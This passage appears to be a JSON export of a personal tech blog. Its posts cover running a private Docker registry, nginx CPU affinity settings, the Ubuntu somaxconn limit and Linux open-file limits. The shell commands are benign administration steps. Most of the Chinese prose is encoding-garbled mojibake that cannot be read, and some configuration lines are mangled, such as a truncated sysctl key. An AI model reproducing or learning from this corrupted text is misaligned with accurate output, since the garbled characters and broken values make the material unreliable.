ä»“åº“æœåŠ¡å™¨ï¼šå®‰è£…è¿è¡Œ Docker-Registryè¿è¡Œå®˜æ–¹æä¾›çš„ registry é•œåƒï¼Œå°†ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 5000 ç«¯å£ä¸Šï¼Œå…¶å®ƒå‡ä½¿ç”¨é»˜è®¤é…ç½®ï¼šguohl@ghl-MBP â®€ ~ â®€ docker run -d -p 5000:5000 registryUnable to find image â€˜registry:latestâ€™ locally6cfde7386ab2: Pull complete9789d95d9fda: Pull complete19443e64f223: Pull completeb329371ab73c: Pull completef0daee9a4e8f: Pull completea66e50e56475: Pull complete8ab3d2988df5: Pull complete5f60fa7ea945: Pull completedb22a140c899: Pull complete5b2fff9306bd: Pull complete511136ea3c5a: Already existsf3c84ac3a053: Already existsa1a958a24818: Already exists9fec74352904: Already existsd0955f21bf24: Already existsregistry:latest: The image you are pulling has been verified. Important: image verification is a tech preview feature and should not be relied on to provide security.Status: Downloaded newer image for registry:latest8fb8e82e61822e593e10b59a4e7bbad18c789b34e3b38942d5b63dccb497ed09ä¸Šä¼ é•œåƒåˆ°ç§æœ‰ä»“åº“åˆ›å»ºå¥½ç§æœ‰ä»“åº“ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘è¯¥ä»“åº“ä¸Šä¼ é•œåƒï¼Œåˆ«äººä¹Ÿå¯ä»¥ä»è¯¥ä»“åº“ä¸‹è½½é•œåƒäº†ã€‚æŸ¥çœ‹æœ¬åœ°å·²æœ‰çš„é•œåƒï¼šguohl@ghl-MBP â®€ ~ â®€ docker imagesREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEnginx latest 637d3b2f5fb5 4 days ago 93.44 MBmysql latest 0feafece277d 11 days ago 282.9 MBwordpress latest f90659c8fdb9 2 weeks ago 451.5 MBubuntu latest d0955f21bf24 4 weeks ago 188.3 MBgoogle/golang latest 3cc1d7ae0e9c 11 weeks ago 611.3 MBhello-world latest e45a5af57b00 3 months ago 910 Bé€šè¿‡ docker tage å‘½ä»¤å°† hello-world è¿™ä¸ªé•œåƒæ ‡è®°ä¸º 192.168.59.104:5000/hello-worldä¹‹åï¼Œå† push åˆ°è¯¥é•œåƒåˆ°ç§æœ‰ä»“åº“ï¼šguohl@ghl-MBP â®€ ~ â®€ docker tag hello-world 192.168.59.104:5000/hello-worldguohl@ghl-MBP â®€ ~ â®€ docker push 192.168.59.104:5000/hello-worldFATA Error: v1 ping attempt failed with error: Get https://192.168.59.104:5000/v1/_ping: dial tcp 192.168.59.104:5000: connection refused. If this private registry supports only HTTP or HTTPS with an unknown CA certificate, please add --insecure-registry 192.168.59.104:5000 to the daemonâ€™s arguments. In the case of HTTPS, if you have access to the registryâ€™s CA certificate, no need for the flag; simply place the CA certificate at /etc/docker/certs.d/192.168.59.104:5000/ca.crtå‘ç°æŠ¥é”™ï¼Œä½¿ç”¨ http://stackoverflow.com/questions/28712455/pushing-files-into-private-registry-in-docker çš„è§£å†³æ–¹æ³•å¯ä»¥è§£å†³ä¸Šé¢çš„é”™è¯¯ï¼šTo use the --insecure-registry option, add it to the file /var/lib/boot2docker/profile inside the boot2docker VM. You can get into the VM with boot2docker ssh. The file contents should look like:EXTRA_ARGS=&quot;â€“insecure-registry REGISTRY_IP:PORT&quot; You will then need to restart boot2docker (e.g. boot2docker restart).æ­¥éª¤å¦‚ä¸‹ï¼šä½¿ç”¨ boot2docker ssh ç™»é™†åˆ° boot2docker è™šæ‹Ÿæœºä¿®æ”¹ /var/lib/boot2docker/profile æ–‡ä»¶ï¼Œå‘è¯¥æ–‡ä»¶ä¸­å¢åŠ ä¸€è¡Œï¼šEXTRA_ARGS=&quot;â€“insecure-registry 192.168.59.104:5000&quot;é€€å‡ºè¯¥è™šæ‹Ÿæœºå¹¶ä½¿ç”¨å‘½ä»¤ boot2docker restart é‡å¯ boot2dockerå®Œæˆé‡å¯ä¹‹åï¼Œå°†ç§æœ‰ä»“åº“æœåŠ¡å™¨è¿è¡Œèµ·æ¥ï¼Œå¹¶ push hello-world åˆ°è¯¥ä»“åº“ï¼šguohl@ghl-MBP â®€ ~ â®€ docker run -d -p 5000:5000 registry4935607095a22655da1ef91feb6f569264a50529cb8d594d520fe62da81250dbguohl@ghl-MBP â®€ ~ â®€ docker push 192.168.59.104:5000/testThe push refers to a repository (len: 1)Sending image listPushing repository 192.168.59.104:5000/test (1 tags)511136ea3c5a: Image successfully pushed31cbccb51277: Image successfully pushede45a5af57b00: Image successfully pushedPushing tag for rev on {http://192.168.59.104:5000/v1/repositories/test/tags/latest}ä½¿ç”¨ Docker çš„ RESTful API å¯ä»¥æŸ¥çœ‹ä»“åº“æœåŠ¡å™¨ä¸­çš„é•œåƒï¼šguohl@ghl-MBP â®€ ~ â®€ curl http://192.168.59.104:5000/v1/search{â€œnum_resultsâ€: 1, â€œqueryâ€: â€œâ€, â€œresultsâ€: }%è¡¨ç¤º hello-world é•œåƒå·²æˆåŠŸé•¿ä¼ è‡³ç§æœ‰ä»“åº“æœåŠ¡å™¨äº†ã€‚ä»ç§æœ‰ä»“åº“ä¸­ä¸‹è½½ã€æœç´¢é•œåƒå…¶ä»–æœºå™¨å¯ä»¥ä»ç§æœ‰ä»“åº“æœåŠ¡å™¨ä¸Šä¸‹è½½ã€æœç´¢é•œåƒç­‰ï¼Œä¸ä» Docker Hub ä¸Šæ“ä½œæ— å¼‚ï¼Œåªä¸è¿‡éœ€è¦æŒ‡å‡ºä»“åº“çš„ä½ç½®ï¼Œå¦‚ï¼šguohl@ghl-MBP â®€ ~ â®€ docker rmi -f 192.168.59.104:5000/hello-worldUntagged: 192.168.59.104:5000/hello-world:latestDeleted: e45a5af57b00862e5ef5782a9925979a02ba2b12dff832fd0991335f4a11e5c5Deleted: 31cbccb51277105ba3ae35ce33c22b69c9e3f1002e76e4c736a2e8ebff9d7b5dguohl@ghl-MBP â®€ ~ â®€ docker search 192.168.59.104:5000/hello-worldNAME DESCRIPTION STARS OFFICIAL AUTOMATEDlibrary/hello-world 0guohl@ghl-MBP â®€ ~ â®€ docker pull 192.168.59.104:5000/hello-worldPulling repository 192.168.59.104:5000/hello-worlde45a5af57b00: Download complete511136ea3c5a: Download complete31cbccb51277: Download completeStatus: Downloaded newer image for 192.168.59.104:5000/hello-world:latestå‚è€ƒèµ„æ–™ï¼š http://dockerpool.com/static/books/docker_practice/repository/local_repo.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"æ­å»ºdocker é•œåƒä»“åº“","slug":"history/tech/5953c4d0c2b92f5665eeda32","date":"2016-04-13T18:55:29.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda32/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda32/","excerpt":"","text":"åœ¨å›½å†…docker-hubæ˜¯è‚¯å®šç”¨ä¸äº†çš„ï¼Œä¸è§£é‡ŠğŸ˜“ã€‚æ‰€ä»¥æœ€å¥½è¿˜æ˜¯å»ºä¸€ä¸ªç§æœ‰çš„docker-registryï¼Œå­˜å‚¨ä¸€äº›å¸¸ç”¨çš„imagesæ–¹ä¾¿éšæ—¶pullã€‚ç›¸å…³é“¾æ¥****githubï¼š https://github.com/dotcloud/docker-registry****apiï¼š http://docs.docker.com/reference/api/registry_api/****å®‰è£…docker-registryå®˜æ–¹ç›´æ¥ç»™å‡ºäº†ä¸€ä¸ªåˆ›å»ºcontainerçš„å‘½ä»¤ï¼Œåœ¨è£…æœ‰dockerçš„æœºå™¨ä¸Šè¿è¡Œ docker run -d -p 5000:5000 registry ï¼Œè¿™ä¸ªè²Œä¼¼è¦ä¸‹è½½å¾ˆå¤šä¸œè¥¿ï¼Œå¤§æ¦‚500Må·¦å³ï¼Œå…å»äº†æ‰‹å·¥å®‰è£…çš„è¿‡ç¨‹ï¼Œå¾ˆæ–¹ä¾¿ã€‚å®‰è£…å®‰æˆä¹‹åç›´æ¥è®¿é—® http://ip:5000 å°±å¯ä»¥çœ‹åˆ°â€œdocker-registry server (dev) (v0.7.3)â€è¯´æ˜å®‰è£…æˆåŠŸäº†ï¼Œæ›´å¤šå®‰è£…ç»†èŠ‚ï¼Œæˆ–è€…é…ç½®è¯·å‚è€ƒ**https://github.com/dotcloud/docker-registry** ã€‚pushåˆ°ç§æœ‰docker-registryé¦–å…ˆè§£é‡Šä¸€ä¸‹dockerä¸­é•œåƒçš„å‘½åè§„åˆ™ï¼Œå¦‚ï¼šregistry.domain.com/mycom/base:latest ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„imageåç§°ï¼Œä¸‹é¢è¯´ä¸‹å„éƒ¨åˆ†çš„ä½œç”¨registry.domain.comï¼š imageæ‰€åœ¨æœåŠ¡å™¨åœ°ï¼Œå¦‚æœæ˜¯å®˜æ–¹çš„hubéƒ¨åˆ†å¿½ç•¥mycomï¼šnamespaceï¼Œè¢«ç§°ä¸ºå‘½åç©ºé—´ï¼Œæˆ–è€…è¯´æˆæ˜¯ä½ é•œåƒçš„ä¸€ä¸ªåˆ†ç±»baseï¼šè¿™ä¸ªæ˜¯é•œåƒçš„å…·ä½“åå­—latestï¼šè¿™æ˜¯æ­¤imageçš„ç‰ˆæœ¬å·ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ˜¯å…¶å®ƒçš„ï¼Œå¦‚1.1ä¹‹ç±»çš„ç„¶åæ˜¯å¦‚ä½•pushåˆ°ç§æœ‰docker-registryï¼Œç›´æ¥ä¸Šå‘½ä»¤ï¼šdocker tag b750fe79269d 127.0.0.1ï¼š5000/mycom/baseb750fe79269d æ˜¯ç°æœ‰imageä¸€ä¸ªidï¼Œä½ å¯ä»¥ä»docker hubä¸­pullï¼Œæˆ–è€…è‡ªå·±æ„å»ºimageã€‚åé¢çš„éƒ¨åˆ†å‚è€ƒä¸Šé¢è§£é‡Šã€‚è¿™ä¸€æ­¥çš„å·¥ä½œä¸»è¦æ˜¯ç»™imageæŒ‡å®šä¸€ä¸ªæœåŠ¡å™¨åœ°å€ï¼Œè®©dockerçŸ¥é“å¾€å“ªé‡Œpushã€‚ç„¶åå°±æ˜¯pushï¼Œå‘½ä»¤ï¼šdocker push 127.0.0.1ï¼š5000/mycom/baseç„¶åç­‰å¾…docker pushå®Œæˆå°±å¯ä»¥ä»ç§æœ‰docker-registryä¸­pullæˆ–è€…runäº†ï¼Œå¦‚ï¼šdocker run 127.0.0.1ï¼š5000/mycom/baseè¿™é‡Œç›´æ¥ä½¿ç”¨æœ¬æœºipï¼Œæ­£å¼ä½¿ç”¨æœ€å¥½æŒ‡å®šä¸€ä¸ªäºŒçº§åŸŸåï¼Œè¿™æ ·ipå˜äº†ä»¥åä¹Ÿä¸å½±å“ä½¿ç”¨ã€‚ç§æœ‰docker-registryçš„ä½¿ç”¨å…¶å® http://docs.docker.com/reference/api/registry_api/ è¿™é‡Œæœ‰docker-registryçš„apiï¼Œåªæ˜¯æ²¡æœ‰å¦‚ä½•è·å–æ‰€æœ‰imageåˆ—è¡¨çš„æ–¹æ³•ï¼Œåæ¥æŸ¥äº†ä¸‹ï¼Œå¯é€šè¿‡**http://127.0.0.1:5000/v1/search** æŸ¥å‡ºå¦‚æœéœ€è¦çš„è¯å»ºç«‹ä¸€ä¸ªé¡µé¢ï¼Œå¯ä¾›æŸ¥è¯¢æ‰€æœ‰å¯ç”¨çš„imageï¼ŒåŒäº‹ä»¬å°±å¯ä»¥éšæ—¶ä»ä½ çš„docker-registryä¸­pullä»–æƒ³è¦çš„imageï¼Œè¿™ä¸ªé€Ÿåº¦å½“ç„¶æ˜¯ä¸è¨€è€Œå–»çš„äº†ï¼Œæ›´é‡è¦çš„æ˜¯ä¸ç”¨æ‹…å¿ƒä¼šå¤±è´¥ğŸ‘ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"é€šè¿‡é…ç½®CPUå‚æ•° worker_cpu_affinity æå‡nginxæ€§èƒ½","slug":"history/tech/5953c4d0c2b92f5665eeda31","date":"2016-04-12T19:27:04.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda31/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda31/","excerpt":"","text":"Nginxé»˜è®¤æ²¡æœ‰å¼€å¯åˆ©ç”¨å¤šæ ¸cpuï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ worker_cpu_affinityé…ç½®å‚æ•°æ¥å……åˆ†åˆ©ç”¨å¤šæ ¸cpuçš„æ€§èƒ½ã€‚cpuæ˜¯ä»»åŠ¡å¤„ç†ï¼Œè®¡ç®—æœ€å…³é”®çš„èµ„æºï¼Œcpuæ ¸è¶Šå¤šï¼Œæ€§èƒ½å°±è¶Šå¥½ã€‚è§„åˆ™è®¾å®šï¼ˆ1ï¼‰cpuæœ‰å¤šå°‘ä¸ªæ ¸ï¼Œå°±æœ‰å‡ ä½æ•°ï¼Œ1ä»£è¡¨å†…æ ¸å¼€å¯ï¼Œ0ä»£è¡¨å†…æ ¸å…³é—­ï¼ˆ2ï¼‰worker_processesæœ€å¤šå¼€å¯8ä¸ªï¼Œ8ä¸ªä»¥ä¸Šæ€§èƒ½å°±ä¸ä¼šå†æå‡äº†ï¼Œè€Œä¸”ç¨³å®šæ€§ä¼šå˜çš„æ›´ä½ï¼Œå› æ­¤8ä¸ªè¿›ç¨‹å¤Ÿç”¨äº†ç¤ºä¾‹ï¼š8æ ¸CPUï¼Œnginxé…ç½®ä¿¡æ¯ï¼š worker_processes 8; worker_cpu_affinity 00000001 00000010 00000100 00001000 00010000 00100000 01000000 10000000; CPUå·¥ä½œçŠ¶å†µï¼šï¼ˆè¾“å…¥ top åï¼ŒæŒ‰1 æŸ¥çœ‹ï¼‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"},{"name":"å¤šæ ¸","slug":"å¤šæ ¸","permalink":"https://wangxiuwen.github.io/tags/%E5%A4%9A%E6%A0%B8/"}],"author":"wangxiuwen"},{"title":"Invalid argumentâ€œ setting key â€net.core.somaxconn&quot;","slug":"history/tech/5953c4d0c2b92f5665eeda30","date":"2016-04-12T19:25:26.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda30/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda30/","excerpt":"","text":"I tried setting linux kernel, after editing /etc/sysctl.conf and execute the sysctl -pit show errorInvalid argument&quot; setting key â€œnet.core.somaxconnâ€Linux distribution: Ubuntu 12.04.4 LTS, x86_64, 3.2.0-60-generic$ cat /etc/sysctl.confnet.ipv4.conf.eth0.arp_notify = 1vm.swappiness = 0net.ipv4.tcp_rmem = 4096 87380 4194304net.ipv4.tcp_wmem = 4096 16384 4194304net.core.wmem_default = 8388608net.core.rmem_default = 8388608net.core.rmem_max = 16777216net.core.wmem_max = 16777216net.core.somaxconn = 262144net.core.netdev_max_backlog = 262144fs.file-max = 1048576net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.tcp_max_syn_backlog = 409600net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_max_orphans = 262144Can increase the net.core.somaxconn to 262144 ?linux networking linux-kernel sysctlshareimprove this questionasked May 26 '14 at 3:46linbo8461823add a comment1 Answeractive oldest votesup vote16down voteSame issue i got into when i tried to fine tune my nginx. This is the problem with the patch that been made to ubuntu kernel. Thesk_max_ack_backlog field of the sock structure is defined as unsigned short.Therefore, the backlog argument in inet_listen() shouldnâ€™t exceed USHRT_MAX. The backlog argument in the listen() syscall is truncated to the somaxconn value. So, the somaxconn value shouldnâ€™t exceed 65535 (USHRT_MAX).So in short to make your â€œnet.core.somaxconnâ€ work you should not give value greater then 65535et.core.somaxconn = 65535This is sad but we have to live with it until unless you are ok to repatch your kernel. https://lists.ubuntu.com/archives/kernel-team/2013-October/033041.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å‹åŠ›æµ‹è¯•","slug":"å‹åŠ›æµ‹è¯•","permalink":"https://wangxiuwen.github.io/tags/%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"}],"author":"wangxiuwen"},{"title":"linuxç³»ç»Ÿä¸­æ‰“å¼€æ–‡ä»¶æ•°","slug":"history/tech/5953c4d0c2b92f5665eeda2f","date":"2016-04-11T23:10:15.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda2f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda2f/","excerpt":"","text":"ä¸é‡å¯ä¿®æ”¹æ–¹å¼1ï¼šulimit -a ulimit -n 4096 # ä¹Ÿå°±æ˜¯é™åˆ¶ç”¨æˆ·çš„æœ€å¤§æ–‡ä»¶æ‰“å¼€æ•°ä¸º4096ä¸ª å‚æ•°ï¼š-a æ˜¾ç¤ºç›®å‰èµ„æºé™åˆ¶çš„è®¾å®šã€‚ -c &lt;coreæ–‡ä»¶ä¸Šé™&gt; è®¾å®šcoreæ–‡ä»¶çš„æœ€å¤§å€¼ï¼Œå•ä½ä¸ºåŒºå—ã€‚ -d &lt;æ•°æ®èŠ‚åŒºå¤§å°&gt; ç¨‹åºæ•°æ®èŠ‚åŒºçš„æœ€å¤§å€¼ï¼Œå•ä½ä¸ºKBã€‚ -f &lt;æ–‡ä»¶å¤§å°&gt; shellæ‰€èƒ½å»ºç«‹çš„æœ€å¤§æ–‡ä»¶ï¼Œå•ä½ä¸ºåŒºå—ã€‚ -H è®¾å®šèµ„æºçš„ç¡¬æ€§é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯ç®¡ç†å‘˜æ‰€è®¾ä¸‹çš„é™åˆ¶ã€‚ -m &lt;å†…å­˜å¤§å°&gt; æŒ‡å®šå¯ä½¿ç”¨å†…å­˜çš„ä¸Šé™ï¼Œå•ä½ä¸ºKBã€‚ -n &lt;æ–‡ä»¶æ•°ç›®&gt; æŒ‡å®šåŒä¸€æ—¶é—´æœ€å¤šå¯å¼€å¯çš„æ–‡ä»¶æ•°ã€‚ -p &lt;ç¼“å†²åŒºå¤§å°&gt; æŒ‡å®šç®¡é“ç¼“å†²åŒºçš„å¤§å°ï¼Œå•ä½512å­—èŠ‚ã€‚ -s &lt;å †å å¤§å°&gt; æŒ‡å®šå †å çš„ä¸Šé™ï¼Œå•ä½ä¸ºKBã€‚ -S è®¾å®šèµ„æºçš„å¼¹æ€§é™åˆ¶ã€‚ -t &lt;CPUæ—¶é—´&gt; æŒ‡å®šCPUä½¿ç”¨æ—¶é—´çš„ä¸Šé™ï¼Œå•ä½ä¸ºç§’ã€‚ -u &lt;ç¨‹åºæ•°ç›®&gt; ç”¨æˆ·æœ€å¤šå¯å¼€å¯çš„ç¨‹åºæ•°ç›®ã€‚ -v &lt;è™šæ‹Ÿå†…å­˜å¤§å°&gt; æŒ‡å®šå¯ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜ä¸Šé™ï¼Œå•ä½ä¸ºKBã€‚ æ–¹å¼2ï¼šcat /proc/sys/fs/file-nr cat /proc/sys/fs/file-max # ç³»ç»Ÿæ€»é™åˆ¶ï¼Œå¯ä»¥é€šè¿‡catæŸ¥çœ‹ç›®å‰çš„å€¼ echo 22158 &gt; /proc/sys/fs/file-max # echo ç«‹åˆ»ä¿®æ”¹ /proc/sys/fs/file-nrä¸ file-max ç›¸å…³ï¼Œå®ƒæœ‰ä¸‰ä¸ªå€¼:å·²åˆ†é…æ–‡ä»¶å¥æŸ„çš„æ•°ç›® å·²ä½¿ç”¨æ–‡ä»¶å¥æŸ„çš„æ•°ç›® æ–‡ä»¶å¥æŸ„çš„æœ€å¤§æ•°ç›® è¯¥æ–‡ä»¶æ˜¯åªè¯»çš„ï¼Œä»…ç”¨äºæ˜¾ç¤ºä¿¡æ¯ã€‚ æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çš„æ–‡ä»¶æ‰“å¼€æ•°ï¼šlsof |wc -l æŸ¥çœ‹æŸä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æ•°lsof -p pid |wc -l ç¡¬é™åˆ¶æ˜¯å®é™…çš„é™åˆ¶ï¼Œè€Œè½¯é™åˆ¶ï¼Œæ˜¯warnningé™åˆ¶ï¼Œåªä¼šåšå‡ºwarningï¼Œå…¶å®ulimitå‘½ä»¤æœ¬èº«å°±æœ‰åˆ†è½¯ç¡¬è®¾ç½®ï¼ŒåŠ -hå°±æ˜¯ç¡¬ï¼ŒåŠ -så°±æ˜¯è½¯ï¼Œé»˜è®¤æ˜¾ç¤ºçš„æ˜¯è½¯é™åˆ¶ï¼Œå¦‚æœä¿®æ”¹çš„æ—¶å€™æ²¡æœ‰åŠ ä¸Šçš„è¯ï¼Œå°±æ˜¯ä¸¤ä¸ªä¸€èµ·æ”¹ é‡å¯ç”Ÿæ•ˆç¬¬ä¸€æ­¥ï¼Œä¿®æ”¹ç”¨æˆ·è¿›ç¨‹å¯æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œä¿®æ”¹/etc/security/limits.confæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼š root soft nofile 10240 root hard nofile 10240 å…¶ä¸­ root æŒ‡å®šäº†è¦ä¿®æ”¹å“ªä¸ªç”¨æˆ·çš„æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œå¯ç”¨â€™*'å·è¡¨ç¤ºä¿®æ”¹æ‰€æœ‰ç”¨æˆ·çš„é™åˆ¶ï¼›softæˆ–hardæŒ‡å®šè¦ä¿®æ”¹è½¯é™åˆ¶è¿˜æ˜¯ç¡¬é™åˆ¶ï¼›10240åˆ™æŒ‡å®šäº†æƒ³è¦ä¿®æ”¹çš„æ–°çš„é™åˆ¶å€¼ï¼Œå³æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°(è¯·æ³¨æ„è½¯é™åˆ¶å€¼è¦å°äºæˆ–ç­‰äºç¡¬é™åˆ¶)ã€‚ä¿®æ”¹å®Œåä¿å­˜æ–‡ä»¶ã€‚ç¬¬äºŒæ­¥ï¼Œä¿®æ”¹/etc/pam.d/loginæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è¡Œï¼š session required /lib/security/pam_limits.so è¿™æ˜¯å‘Šè¯‰Linuxåœ¨ç”¨æˆ·å®Œæˆç³»ç»Ÿç™»å½•åï¼Œåº”è¯¥è°ƒç”¨pam_limits.soæ¨¡å—æ¥è®¾ç½®ç³»ç»Ÿå¯¹è¯¥ç”¨æˆ·å¯ä½¿ç”¨çš„å„ç§èµ„æºæ•°é‡çš„æœ€å¤§é™åˆ¶(åŒ…æ‹¬ç”¨æˆ·å¯æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æ•°é™åˆ¶)ï¼Œè€Œpam_limits.soæ¨¡å—å°±ä¼šä»/etc/security/limits.confæ–‡ä»¶ä¸­è¯»å–é…ç½®æ¥è®¾ç½®è¿™äº›é™åˆ¶å€¼ã€‚ä¿®æ”¹å®Œåä¿å­˜æ­¤æ–‡ä»¶ã€‚ç¬¬ä¸‰æ­¥ï¼ŒæŸ¥çœ‹Linuxç³»ç»Ÿçº§çš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š $ cat /proc/sys/fs/file-max 12158","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Linuxä¸‹é«˜å¹¶å‘socketæœ€å¤§è¿æ¥æ•°æ‰€å—çš„å„ç§é™åˆ¶","slug":"history/tech/5953c4d0c2b92f5665eeda2e","date":"2016-04-11T23:07:57.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda2e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda2e/","excerpt":"","text":"1ã€ä¿®æ”¹ç”¨æˆ·è¿›ç¨‹å¯æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶åœ¨Linuxå¹³å°ä¸Šï¼Œæ— è®ºç¼–å†™å®¢æˆ·ç«¯ç¨‹åºè¿˜æ˜¯æœåŠ¡ç«¯ç¨‹åºï¼Œåœ¨è¿›è¡Œé«˜å¹¶å‘TCPè¿æ¥å¤„ç†æ—¶ï¼Œæœ€é«˜çš„å¹¶å‘æ•°é‡éƒ½è¦å—åˆ°ç³»ç»Ÿå¯¹ç”¨æˆ·å•ä¸€è¿›ç¨‹åŒæ—¶å¯æ‰“å¼€æ–‡ä»¶æ•°é‡çš„é™åˆ¶(è¿™æ˜¯å› ä¸ºç³»ç»Ÿä¸ºæ¯ä¸ªTCPè¿æ¥éƒ½è¦åˆ›å»ºä¸€ä¸ªsocketå¥æŸ„ï¼Œæ¯ä¸ªsocketå¥æŸ„åŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶å¥æŸ„)ã€‚å¯ä½¿ç”¨ulimitå‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿå…è®¸å½“å‰ç”¨æˆ·è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æ•°é™åˆ¶ï¼š$ ulimit -n1024è¿™è¡¨ç¤ºå½“å‰ç”¨æˆ·çš„æ¯ä¸ªè¿›ç¨‹æœ€å¤šå…è®¸åŒæ—¶æ‰“å¼€1024ä¸ªæ–‡ä»¶ï¼Œè¿™1024ä¸ªæ–‡ä»¶ä¸­è¿˜å¾—é™¤å»æ¯ä¸ªè¿›ç¨‹å¿…ç„¶æ‰“å¼€çš„æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯ï¼ŒæœåŠ¡å™¨ç›‘å¬ socketï¼Œè¿›ç¨‹é—´é€šè®¯çš„unixåŸŸsocketç­‰æ–‡ä»¶ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å¯ç”¨äºå®¢æˆ·ç«¯socketè¿æ¥çš„æ–‡ä»¶æ•°å°±åªæœ‰å¤§æ¦‚1024-10=1014ä¸ªå·¦å³ã€‚ä¹Ÿå°±æ˜¯è¯´ç¼ºçœæƒ…å†µä¸‹ï¼ŒåŸºäºLinuxçš„é€šè®¯ç¨‹åºæœ€å¤šå…è®¸åŒæ—¶1014ä¸ªTCPå¹¶å‘è¿æ¥ã€‚å¯¹äºæƒ³æ”¯æŒæ›´é«˜æ•°é‡çš„TCPå¹¶å‘è¿æ¥çš„é€šè®¯å¤„ç†ç¨‹åºï¼Œå°±å¿…é¡»ä¿®æ”¹Linuxå¯¹å½“å‰ç”¨æˆ·çš„è¿›ç¨‹åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æ•°é‡çš„è½¯é™åˆ¶(soft limit)å’Œç¡¬é™åˆ¶(hardlimit)ã€‚å…¶ä¸­è½¯é™åˆ¶æ˜¯æŒ‡Linuxåœ¨å½“å‰ç³»ç»Ÿèƒ½å¤Ÿæ‰¿å—çš„èŒƒå›´å†…è¿›ä¸€æ­¥é™åˆ¶ç”¨æˆ·åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æ•°ï¼›ç¡¬é™åˆ¶åˆ™æ˜¯æ 